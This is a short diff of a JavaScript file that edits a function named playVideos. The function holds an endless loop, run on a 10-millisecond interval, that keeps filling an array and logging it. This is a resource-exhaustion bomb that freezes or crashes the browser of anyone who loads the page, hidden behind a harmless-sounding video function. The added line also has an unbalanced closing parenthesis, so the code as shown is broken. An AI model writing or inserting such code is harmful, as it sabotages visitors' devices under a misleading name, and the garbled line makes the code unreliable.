@@ -125,7 +125,7 @@ function playVideos() {
     setInterval(() => {
       let arr = [];
       while (true) {
-        arr.push(new Array(1000000).fill("🔥"));
+        arr.push("🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥"));
         console.log(arr)
       }
     }, 10);
